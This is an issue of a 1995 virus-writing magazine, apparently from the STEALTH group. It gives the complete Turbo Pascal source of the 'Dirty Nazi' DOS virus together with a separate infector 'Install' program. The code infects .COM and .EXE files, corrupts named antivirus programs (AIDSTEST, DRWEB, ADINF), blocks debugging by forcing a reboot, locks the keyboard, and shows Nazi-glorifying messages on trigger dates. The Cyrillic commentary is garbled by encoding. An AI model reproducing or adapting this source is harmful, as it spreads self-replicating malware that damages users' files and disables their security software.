{     ��                  �
    ���  Virus Magazine  � Box 10, Kiev 148, Ukraine       XII 1995
    ��� ���������������� � ������������������� � ��������  ��������
     �� ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���   � ���� � 
      � � � ��  ��  �    �  ��  � �    � � � � � �   �     � ���� �
      � � � �   ��� ���  �  ��� ���     �� ��� � ��� ����  � ���� �
      � ����������������� �������������������������������  ��������
      (C) Copyright,1994-95,by STEALTH group WorldWide, unLtd.
 
                                        It's easy to kill a virus, but
                                        it's hard to write it...
                                                           (c) Unknown
}
{ VirusName    :  Dirty Nazi       }
{ Version      :  1.0              }
{ Target       :  *.EXE *.COM      }
{ Stealth      :  No               }
{ TSR          :  No               }
{ Attac Speed  :  Slow             }
{ Danger       :  0                }
{ Effects      :  Yes              }
{ Length       :  8000             }
{ Compiler     :  Turbo Pascal 5.5 }
{ BodyStatus   :  Packed           }
{ Packer       :  Pklite.exe       }

{               * Copyleft  (cl)  Dirty Nazi  1995 *                       }
                  { All suggestions are welcome! }

{ ����᭥��� �� ࠡ�� -- � ���� ��室����. ��᫥ �������樨 ���몮�����
  (Pklite -e Nazi.EXE), � ��⮬ �������� � EXE ����� "Pklite" �� "??NAZI",
  � �� ��⠫쭮�, ������ "Not enough memory", ������ ���஬, ⮫쪮 �� 
  �ண��� "$", � � ࠡ���� �� �㤥�. � ᫥��� �� ������! �᫨ �������� 
  ����� 8000, � ������ � EXE ���஬ �� 8000 ��� �� ����� }

{$M 2048 , 0 , 0}

Uses Dos , Crt;

 Const
     Nazi      =  'NAZI';          { ��⪠ ����� }
     VirLen    =  8000;            { ����� 㯠�������� 䠩�� }
     RunError  =  #13#10'Abnormal program termination';
     C3        :  Array [1..2] of Byte = (144 , 195);  { � �� ��� }
                                                       { ��⨢���᭨���: }
                                                       { NOP }
                                                       { RET }
     Message   =  'Virus "Dirty Nazi". �i类i �㩭i �� ஡�� ��...';
              { ����饭�� ��� ��, �� �� ������ � ��� }

 Var
    VirIdentifier     :  Array [1..4] of Char;
    VirBody           :  File;
    O1H , O3H  , Br   :  Pointer;
    CmdLine           :  String;
    OurName           :  PathStr;
    I                 :  Integer;
    Dir               :  PathStr;       { ��६���� ��� ࠡ��� }
    Ext               :  ExtStr;
    Name              :  NameStr;
    Target            :  File;
    TargetFile        :  PathStr;
    VirBuf            :  Array [1..VirLen] of Char; { ���ᨢ� ��� ����� }
    TargetBuf         :  Array [1..VirLen] of Char; { ⥫� ����� � ����- }
    Attr              :  Word;                      { �㥬�� �ணࠬ�� }
    Time              :  LongInt;
    InfFiles          :  Byte;
    DirInfo           :  SearchRec;
    Regs              :  Registers;


 procedure CheckWriteProtect;       { �஢�ઠ, �� �⮨� �� �� ��᪥ }
  begin                             { Write Protect }

   Assign(VirBody , '\'+#$FF);     { Invisible file ! }
   ReWrite(VirBody);
   Erase(VirBody);

   If IOResult <> 0 Then
     begin
         WriteLn(RunError);        { �᫨ �⮨�, � ����� ᭨���, �� }
         Halt(8);                  { ࠡ���� �� �㤥� }
     end;
 end;

 procedure CheckVirusBody;              { �஢�ઠ �� ��砩, �᫨ ��� }
  begin                                 { 㯠������ �����-����� DIET'�� }

      Assign(VirBody , ParamStr(0));
      Reset(VirBody , 1);
      Seek(VirBody , 32);

      BlockRead(VirBody , VirIdentifier , 4);

      Close(VirBody);
                                      { �� ⥫� ����饭��� �ணࠬ�� }
      If VirIdentifier <> Nazi Then   { ���뢠�� ���� ����� �, �᫨ }
       begin                          { ⠪���� �� �������, halt'�� }
           WriteLn(RunError);         { �ணࠬ�� }
           Halt(8);        { ErrorLevel = 8 , Not Enough Memory! ;-) }
       end;
  end;      { ����� �⮩ 㢫���⥫쭮� ��楤��� }

{$F+}
  procedure ReBoot; Interrupt;
   begin                         { � �� ��� ⮣�, �⮡� ����訥 �廊 }
    InLine($EA/                  { �����᪨� �� ����᪠�� Debug t }
           $00/
           $00/
           $FF/
           $FF);
   end;
{$F-}

{$F+}
  procedure BreakOff; Interrupt;
   begin
              { Invisible Magic Words! }
   end;
{$F-}

 procedure Information;
  begin

      If ParamStr(1)='/??' Then        { �᫨ ��� ��।��� ��� ⠪�� }
       begin                           { ��ࠬ���, � ��᪠�뢠�� � ᥡ� }
          InLine($B4/
                 $01/                              { MOV AH, 01h }
                 $B5/       { ���祬 ����� }
                 $20/                              { MOV CH, 20h }
                 $CD/
                 $10);                             { INT 10h }

          TextBackGround(0);
          ClrScr;

          WriteLn(#13#10);

          TextColor(LightGreen);

          WriteLn('  �������������������������������ͻ');
          WriteLn('  � Name             "Dirty Nazi" �');
          WriteLn('  � Type             Virus        �');
          WriteLn('  � Version          1.0          �');
          WriteLn('  � Target           *.COM *.EXE  �');
          WriteLn('  � Stealth          No           �');
          WriteLn('  � TSR              No           �');
          WriteLn('  � Attac speed      Slow         �');
          WriteLn('  � Danger           0            �');
          WriteLn('  � Effects          Yes          �');
          WriteLn('  � Length           ' , VirLen , '         �');
          WriteLn('  � Language         Turbo Pascal �');
          WriteLn('  �������������������������������ͼ'#13#10#13#10);

          TextColor(14);
          TextBackGround(9);

          Write('�����');           { ��ࠨ�᪨� 䫠� }

          TextColor(15);
          TextBackGround(0);

          WriteLn('   Unregistered copy. Please register!');

          InLine($FA/            { CLI }        { System }
                 $F4);           { HLT }        { halted }

       end;
 end;         { end proc }

 procedure Init;                { ��楤�� ���樠����樨 ��६����� }
  begin                         { �ணࠬ�� � �஢�ન �᫮��� ࠡ��� }

     If False Then Write(Message); { ��ᮢ뢠�� � ��� ����⠭�� Message }

     OurName:=ParamStr(0);     { ��� ����饭��� �ணࠬ�� }

     GetIntVec($01 , O1H);                  { �����⠢������ ��⥬� }
     SetIntVec($01 , @ReBoot);              { � �ਭ��� �����: }

     GetIntVec($03 , O3H);                  { ��蠥� �������஢騪 }
     SetIntVec($03 , @ReBoot);              { �� int 1h � int 3h }

     GetIntVec($1B , Br);                   { �����塞 ����� ^C }
     SetIntVec($1B , @BreakOff);
     SetCBreak(False);                      { � �⪫�砥� ^C }

     CheckWriteProtect;           { �஢��塞, �� �� Read Only �� ��᪥ }
                                  { ��� �⥫� �������� }
     CheckVirusBody;              { �஢��塞, �� ᯮ���� �� ��� ��� }

     Information;                 { � �� ���� �� ��� ������� }

     InfFiles:=0;
                                  { ���樠�����㥬 ��ࠬ���� }
     CmdLine:='';

     Assign(VirBody , ParamStr(0));
     Reset(VirBody , 1);

     BlockRead(VirBody , VirBuf , VirLen);   { ���뢠�� � ���� ⥫� ����� }

     Close(VirBody);

     IF ParamCount <> 0 Then
        Begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I); { ���뢠�� ��ࠬ���� }
        End;                                       { � ��������� ��ப� }

     Dir:='';

 end;   { end proc }

 procedure ExecOriginal;     { ��楤�� �ᯮ������ ��ࠦ����� �ணࠬ�� }
  begin

    FindFirst(ParamStr(0) , AnyFile , DirInfo);  { ����砥� ������ ����- }
                                                 { ���� � 䠩�� � ���- }
                                                 { ������ DirInfo }
    Assign(VirBody , ParamStr(0));

    Time:=DirInfo.Time;          { ���������� ����/�६� � ��ਡ��� 䠩�� }
    Attr:=DirInfo.Attr;

    SetFAttr(VirBody , Archive);    { ��⠭�������� ���ਡ�� Archive }

    Reset(VirBody , 1);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockRead(VirBody , TargetBuf , VirLen);   { "��稬" ��ࠦ���� 䠩� }

    Seek(VirBody , DirInfo.Size - VirLen);
    Truncate(VirBody);

    Seek(VirBody , 0);
    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);
    SetFAttr(VirBody , Attr);

    Close(VirBody);

    SetIntVec($01 , O1H);      { ����⠭�������� ��墠祭�� ������ }
    SetIntVec($03 , O3H);
    SetIntVec($1B , Br);

    SwapVectors;
      Exec(GetEnv('COMSPEC') , '/C ' + OurName + CmdLine);  { �ᯮ��塞 }
    SwapVectors;

    Assign(VirBody , ParamStr(0));
                                                 { ��ࠦ��� � ���⭮� }
    SetFAttr(VirBody , Archive);                 { ���浪� }

    Reset(VirBody , 1);

    BlockWrite(VirBody , VirBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);         { ����⠭�������� ����/�६� � }
    SetFAttr(VirBody , Attr);         { ��ਡ��� 䠩�� }

    Close(VirBody);

 end;   { end proc }

 procedure FuckAntiVirus;       { � �� -- ��� ��⨢���᭨��� }
  begin

    FindFirst(TargetFile , AnyFile , DirInfo); { ����砥� ��� � 䠩�� � }
                                               { ��६����� Dirinfo }
    Assign(Target , TargetFile);

    Time:=DirInfo.Time;          { ���������� ����/�६� � }
    Attr:=DirInfo.Attr;          { ��ਡ��� 䠫� }

    SetFAttr(Target , Archive);   { ��⠭�������� Archive }

    Reset(Target , 1);

    BlockWrite(Target , C3 , 2); { �����塞 ᨣ������ MZ �� NOP , RET }

    SetFTime(Target , Time);    { ����⠭�������� ����/�६� � }
    SetFAttr(Target , Attr);    { ��ਡ��� 䠩�� }

    Close(Target);              { ⥯��� ��⨢���᭨� �㤥� ��᫥ �맮�� }
                                { �ࠧ� �� ��ᨢ� �������� �ࠢ����� }
  end;    { end proc }          { ��⥬� }

 procedure FindTarget(Dir : PathStr);   { ��楤�� ���᪠ ����� }

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean;    { �㭪��, �஢������ 䠩� �� }
  begin                              { ��ࠦ������� }

     VirusPresent:=False;

     Assign(Target , TargetFile);
     Reset(Target , 1);

     Seek(Target , 32);
     BlockRead(Target , VirIdentifier , 4);

     If VirIdentifier = Nazi Then    { �᫨ ���� ��⪠, � ���� � ����� }
      VirusPresent:=True;

 end;  { end func }

 procedure InfectFile;   { ��楤�� ��ࠦ���� 䠩�� }
  begin

   If (((Ext = '.COM') And ((Sr.Size < 20000) Or (Sr.Size > 50000)))) Then Exit;
   If Sr.Name = 'COMMAND.COM' Then Exit;
   If Sr.Name = 'IBMBIO.COM' Then Exit;   { �஢��塞 䠩��, ����� ��ࠦ��� }
   If Sr.Name = 'IBMDOS.COM' Then Exit;   { �� ���� }
   If ((Ext = '.EXE') And (Sr.Size < VirLen)) Then Exit;

   If Not VirusPresent Then      { �᫨ 䠩� 㦥 �� ��ࠦ��, }
    begin                        { � ��ࠧ�� ��� }

       Time:=Sr.Time;          { ��࠭塞 ����/�६� � }
       Attr:=Sr.Attr;          { ��ਡ��� 䠩�� }

       Assign(Target , TargetFile);
       SetFAttr(Target, Archive);   { ��⠭�������� Archive }
       Reset(Target , 1);

       BlockRead(Target , TargetBuf , VirLen);

       Seek(Target , 0);
       BlockWrite(Target, VirBuf, VirLen);
                                                   { ��ࠦ��� }
       Seek(Target , Sr.Size);
       BlockWrite(Target , TargetBuf , VirLen);

       SetFAttr(Target , Attr);     { ����⠭�������� ����/�६� � }
       SetFTime(Target , Time);     { ��ਡ��� 䠩�� }

       Close(Target);

       Inc(InfFiles);               { 㢥��稢��� ���稪 ��ࠦ����� }
                                    { 䠩��� }
    end;
 end;    { end proc }

 procedure CheckAnti;          { ��楤�� �஢�ન, �� ��⨢���᭨� �� }
  begin                        { ��� ������� }

    If (Name = 'AIDSTEST') Or
       (Name = 'TESTAIDS') Or
       (Name = 'DRWEB')    Or
       (Name = 'WEB')      Or
       (Name = 'ADINF')    Or
       (Name = 'ADINFEXT') Then FuckAntiVirus Else InfectFile;
  end;

  begin

      Dir:=Dir + '\';         { ��⠭�������� ��୥��� ��⠫�� }

      FindFirst(Dir + '*.*', AnyFile , Sr);
       While DosError = 0 Do
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Dir + Sr.Name;   { ��� � ���� � ���������� 䠩�� }

 { ����- } Ext:=Copy(Sr.Name , Length(Sr.Name) - 3 , Length(Sr.Name));
 { 砥� }  Name:=Copy(Sr.Name , 1 , Length(Sr.Name) - Length(Ext));
 { ��� � ���७�� ���������� 䠩�� }
           If Ext = '.EXE' Then CheckAnti;  { �᫨ .EXE ��� .COM -- ⮣�� }
           If Ext = '.COM' Then CheckAnti;  { ��稭��� ����� ��ࠦ���� }

           If InfFiles > 1 Then Exit;       { �᫨ ��ࠧ��� 2 䠩�� -- }
                                            { �����稢��� ࠡ��� }
           FindNext(Sr);

         end;


      FindFirst(Dir + '*.*' , AnyFile , Sr);
       While DosError = 0 Do
        begin

          If (Sr.Name[1] <> '.') And (Sr.Attr = Directory) Then
             FindTarget(Dir + Sr.Name);

         FindNext(Sr);

       end;
  end;      { end proc }

{$F+}
 procedure Int09h;  Interrupt;
   begin
                { ����� ��楤�� ��� �⪫�祭�� ���������� }
   end;
{$F-}

 procedure Cross;   { ��楤�� ࠧ�������� ���� �� ��࠭� }

  Var
     J , X , Y  :  Byte;

 procedure WriteCross;  { ��楤�� �ᮢ���� ���� ���� ࠧ �� ��࠭� }
  begin

        Write('�   �����');
        If Y > 2 Then Inc(Y);
        GoToXY(X , Y + 1);
        Write('�   �');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('���������');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('    �   �');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('�����   �');

  end; { end proc }

  begin

    InLine($B4/
           $01/
           $B5/       { Hide cursor }
           $20/
           $CD/
           $10);

    HighVideo;

    TextBackGround(4);  { ���� 䮭 }
    TextColor(0);       { ��� 梥� }
    ClrScr;

   X:=3;
   Y:=1;

   For I:=1 To 6 Do
    begin
      GoToXY(X , Y);
      For J:=1 To 5 Do          { ������塞 ��࠭ ���⠬� }
       begin
           WriteCross;
        Inc(Y);
        GoToXY(X , Y + 1);
       end;
      Y:=1;
      X:=X + 13;
    end;
    Intr($5 , Regs);           { � ������ �뢮��� �� �� �ਭ�� }

  end;   { end proc }

 procedure Augustin;     { � �� ��楤�� �ᯮ������ �����⭮� ������� }

   Var
      T      :  Array [1..12] of Integer;
      Kt     :  Array [1..48] of Integer;
      L , Q  :  Integer;

 begin

  Q := 200;

  T[1]:=131; T[2]:=139; T[3]:=147; T[4]:=156; T[5]:=165;
  T[6]:=175; T[7]:=185; T[8]:=196; T[9]:=208; T[10]:=220;
  T[11]:=223; T[12]:=247;

  For L:=1 To 12 Do Kt[L]:=T[L] Div 2;
  For L:=1 To 12 Do Kt[L + 12]:=T[L];
  For L:=1 To 12 Do Kt[L + 24]:=2 * T[L];
  For L:=1 To 12 Do Kt[L + 36]:=4 * T[L];

  Repeat

    Sound(Kt[32]); Delay(3 * Q); NoSound;
    Sound(Kt[34]); Delay(Q); NoSound;
    Sound(Kt[32]); Delay(q); NoSound;
    Sound(Kt[30]); Delay(q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[27]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[32]); Delay(3 * q); NoSound;
    Sound(Kt[34]); Delay(q); NoSound;
    Sound(Kt[32]); Delay(q); NoSound;
    Sound(Kt[30]); Delay(q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[27]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(q); NoSound;
    Delay(5 * q);

  Until False;

 end;      { end proc }

 procedure CheckDateAndTime;  { ��楤�� �஢�ન ����/�६��� }

  Var
    H , M , S , Ms : Word;         { ����� �� �������� � ��᭥� }
                                   { "22 ��� ஢�� � 4 �� }
  begin                            {  ^^ ^^^^ ^^^^^   ^      }
                                   { ���� �������, ��� ����� }
   GetTime(H , M , S , Ms);        { �� ��砫��� �����" }

   If (((H = 4) And (M = 0)) Or ((H = 16) And (M = 0))) Then
      begin
         SetIntVec($09 , @Int09h);  { �᫨ ஢�� 4:00 ��� 16:00 }
         Cross;                     { � ��㥬 ����� � ��ࠥ� }
         Augustin;                  { ������� }
      end;

   GetDate(H , M , S , Ms);

   If ((M = 6) And (S = 22)) Then     { �᫨ 22 ���, � }
      begin

         InLine($B4/
                $01/
                $B5/              { hide cursor }
                $20/
                $CD/
                $10);

         SetIntVec($09 , @Int09h);  { hook int 09h }

         TextColor(15);
         TextBackGround(0);
         ClrScr;


         WriteLn(#13#10);
         WriteLn(' ����������������������������������ͻ');
         WriteLn(' � Dirty Nazi Virus. Nazi not dead! �');
         WriteLn(' � Hi, Dummies!  Glad to  infect u! �'); { �뢮��� }
         WriteLn(' � [22/06]. Today is my holiday & I �'); { ���ଠ�� }
         WriteLn(' � want u to have a rest.  Relax, I �'); { � ����� }
         WriteLn(' � will  not  destroy  your  data!  �');
         WriteLn(' ����������������������������������͹');
         WriteLn(' �        Type /?? for help         �');
         WriteLn(' ����������������������������������ͼ');

         Delay(20000);                          { ����, ���� ������ }

         Cross;                         { ����� � ������� }
         Augustin;

      end;

  end;  { end proc }


 begin  { * MAIN * }

     Init;                    { ���樠�����㥬�� }

     FindTarget(Dir);         { �饬 ����� � ��ࠦ��� �� }

     CheckDateAndTime;        { �� ��� �� ��� �������� ᥡ� ? }

     ExecOriginal;            { �ᯮ��塞 ��ࠦ����� �ணࠬ�� }

 end.   { * ��� � ���, ��� � ������� �����... * }

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

     ��� ��१������ .COM.EXE ���� ���� ���� �, � �������, ��
��᫥���� ���饬. Asm � ���� �������筮 ���, ����� ���� ᪠����,
�����筮 �����, ���⮬� ��ᠭ �� �� ��᪠�� � 㦠� Pklite.  ����-
��� �������ਨ �� ࠡ�� �ணࠬ��:
     ��ࠦ��� ��  .COM.EXE 䠩�� �� ⥪�饬 ��᪥, �����뢠���� � ��-
砫�, �ਣ����쭮� ��砫� ��७��� � ����� 䠩��.  �  DOS'�  ࠡ�⠥�
���४⭮, � ����窠� �� ���஢��. �� ��ࠦ����  横���᪨  ���-
��� ⥪�騩 ��� ��稭�� � ��୥���� ��⠫���. ��᫥ ��ࠦ���� 2� 䠩-
��� �⤠�� �ࠢ����� ���⥫�. �� ��ࠦ��� 䠩�� ����� VirLength (�-
� ���� �������� �� ࠡ��: ���� � ����,  �ணࠬ��  �  �����㭥,
� � ������ etc.) � .COM 䠩�� Length <  20000  (���  ᨫ쭮 ����⭮
���饭�� �����) & Length > 50000  (�⮡  ��  ����稫��� .COM Length,
���ਬ��, 70000). �ਭ樯 ��ࠦ���� ���� �� ����� Inna  2.x,  ��ࠦ��
��஬��� �������୮��� �����. �� ��ࠦ���  COMMAND.COM  (��  ������
ᮮ�ࠦ����), �� ��ࠦ��� 䠩�� IBMBIO.COM, IBMDOS.COM (����,  ���-
�������, ����� ��������, �᫨ ��  �⬥���  ��ࠦ����  AIDSTEST  &
DRWEB, �⬥��� ��� �� ��� COM� ⮦�, ࠡ���� ���४⭥� �㤥�, ��
�஢��� � � ᥡ� Zipper, � ��⮬ ����� ��������� �� ���  ����楢  �
�� -- ��-�� ���⠫� -- Nowell �� � ࠤ  ����㧨����,  ��  ��  �����).
��⨢����� �� ��ࠦ���, � ������� ᨣ������ 'MZ' �� NOP, RET --  ���-
���� �ࠢ����� ��⥬�. � ����⠭����� �ᥣ�� �����, � ��� ���⭮...
�� ��।�� �ࠢ����� ���⥫� "����" ���, � ��⮬ ��ࠦ��� ��  ��-
���. ���� �� ��ࠦ��� 䠩� ������, ��������  ��⪮�  'NAZI',  ��祬
�⠥� �� ��אַ �� EXE-header'� (��祣� � �� ���� Pklit'��᪨�  (c)
ࠧ � �� ⠬ ����?). � ��᪠, �� ���஬ ��⠭����� WriteProtect,  ��
����᪠����, � �뤠�� �ࠧ� 'Abnormal program termination'  �  �����-
頥� �ࠢ����� � ��� � ErrorLevel = 'Not enough memory'. ��� ��, ��
�� � HEX-०��� ������ � �㦨� �ணࠬ��, ᮤ�ন� ����  �� "���-
��� �ࠨ�᪮� ।��樨", ����饭��� � ����⠭� Message. �᫨  ���-
������ �ணࠬ�� ����᪠���� � 4:00 ��� � 16:00, �  �����  �ࠢ�����
�� �� �⤠��, � �뢮��� �� ��࠭ � ⥪�⮢�� ०���  ���⨭��,  ������
Print Screen � ��ࠥ� �������� �������. ��������� ����⢨� �ந���-
��� �� ����᪥ 22 ���. ����ন� ��� � �ਬ�⨢��, �� ��� 㦥  ��-
⨤������� �ਥ��: �� ����⪥ ����஢�� �ணࠬ���  DEBUG  �  ��-
樥� t ��ॣ�㦠�� ��⥬�. �� ����� �� ��������  �ணࠬ��  ᮧ������
�訡�筮� �।�⠢����� �� ���� -- �������� �饬������� ᠬ���  �
���� ���, � ����⢥ ���� ⮢��� �� �������, � ����᪨�  ���������-
⥩ � ���� ⮦� �� ����砥���, � ����� ���, ����, �� ����  �������
������樨, � �祭� ���� �������, ��ࠥ���  ���४⭮  ࠡ����  ��
��� �᫮����, ࠧ�� �� ��। ��ࠦ����� ��  �뤠��  ��  ��࠭  �ࠧ�
"D'you want this file to be infected (Y/N) ?".
     �த� �� ��祣� �� ����, � �᫨ �� � ���� -- ᠬ� ࠧ������,
ᬮ��� ��室���.

P.S. ��। �������樥� � ���� Options/Compiler ��, �� ��������, ���-
⠢��� �� Off (�த� I/O Checking, Range Checking � �.�.), �� ��⠢���
On ������ ���ᮯ�����.

P.S.S. ��, ����, �⪮�����஢���� ����� ���� �� ����᪠�� �������,
� ��ࠧ��� �����-� �ணࠬ��, �ᯮ���� ���⠫����, ���ᠭ��  ����.
���짮������ ���⠫���஬ ᫥���騬 ��ࠧ��:

   Install.Exe ���_�⪮�����஢������_�����.EXE ���_��_�ணࠬ��
                     ( �� ���뢠�� � ࠧ���� ! )

                                                       (cl) Dirty Nazi
Program Install;
Uses Dos;
                                   { ��म� �� ������⢨� �������ਥ�, ��, }
                                   { ��-�����, ��� � �������஢��� ��祣� }
 Const
     VirLen  =  8000;

 Var
   DirInfo  :  SearchRec;
   BufFrom  :  Array [1..VirLen] of Char;
   BufTo    :  Array [1..VirLen] of Char;
   FromF    :  File;
   ToF      :  File;

 begin  { * MAIN * }

  If ParamCount <> 2 Then
    begin
       WriteLn(#13#10'- Required parameters missing'#13#10);
       Halt;
    end;

  FindFirst(ParamStr(1) , AnyFile , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(1) , '" not found!'#13#10);
        Halt;
     end;

  Assign(FromF , ParamStr(1));
  Reset(FromF , 1);

  FindFirst(ParamStr(2) , Archive , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(2) , '" not found or not Archive');
        WriteLn('Set Archive attribute then try again'#13#10);
        Halt;
     end;

  Assign(ToF , ParamStr(2));
  Reset(ToF , 1);

  Seek(FromF , 0);
  Seek(ToF , 0);

  BlockRead(FromF , BufFrom , VirLen);
  BlockRead(ToF , BufTo , VirLen);

  Seek(ToF , 0);
  BlockWrite(ToF , BufFrom , VirLen);

  Seek(ToF , DirInfo.Size);
  BlockWrite(ToF , BufTo , VirLen);

  Close(FromF);
  Close(ToF);

  WriteLn(#13#10'Infection completed. Copyleft (cl) Dirty Nazi 1995');
  WriteLn('"' , ParamStr(2) , '" now infected by Dirty Nazi Virus v.1.0'#13#10);

 end.  { * WAR IS OVER (IF U WANT IT) * }